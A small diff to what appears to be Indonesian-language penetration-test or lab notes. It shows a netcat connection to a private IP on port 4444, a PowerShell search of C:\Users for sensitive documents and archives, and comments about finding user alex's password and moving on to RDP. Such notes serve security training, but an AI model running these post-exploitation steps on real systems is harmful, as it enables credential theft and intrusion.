@@ -657,7 +657,7 @@ nc 192.168.219.222 4444
 
 //masuk ke directory C:\Users\diana
 //cari file sensitive 
-Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.zip,*.tar,*.gz -File -Recurse -ErrorAction SilentlyContinue
 
 //ditemukan file .txt, dan password dari user alex 
 //masuk ke rdp 
